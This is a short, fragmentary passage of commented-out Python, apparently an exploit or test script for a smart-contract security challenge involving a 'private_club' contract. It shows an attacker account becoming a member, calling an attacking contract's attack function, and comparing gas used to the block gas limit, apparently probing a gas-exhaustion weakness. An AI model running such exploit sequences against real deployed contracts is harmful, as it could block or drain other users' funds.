...
#     _members = [ownerFriend.address, user2.address, user3.address]

#     private_club.becomeMember(_members, {"from": attacker, "value": "3 ether"}).wait(1)
...
#     attacking_contract.attack(_members, {"from": attacker, "value": f"{amount} ether"})
...
#     print(f"Gas used by user4: {web3.eth.getBlock('latest').gasUsed}")
#     print(f"Gas limit is:      {web3.eth.getBlock('latest').gasLimit}")
